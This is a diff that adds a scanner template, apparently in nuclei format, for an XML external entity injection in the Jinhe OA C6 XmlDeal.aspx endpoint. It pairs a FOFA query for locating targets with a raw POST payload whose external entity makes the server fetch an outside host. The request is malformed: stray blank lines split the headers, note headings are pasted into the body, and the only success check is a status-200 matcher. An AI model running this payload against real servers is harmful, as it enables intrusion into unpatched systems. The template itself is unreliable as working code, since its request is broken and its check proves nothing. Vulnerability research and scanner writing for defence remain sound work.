@@ -1,0 +1,51 @@
+id: poc-ksx8gp5dygqfse3b
+info:
+  name: 金和OAC6 xmldeal xml外部实体注入
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ksx8gp5dygqfse3b'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ksx8gp5dygqfse3b
+    fofa: body="/C6/WebResource.axd"
+http:
+- raw:
+  - 'POST /c6/JHSoft.Web.Message/XmlDeal.aspx HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Content-Type: application/Xml
+
+
+
+
+    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://www.baidu.com"> %remote;]>
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
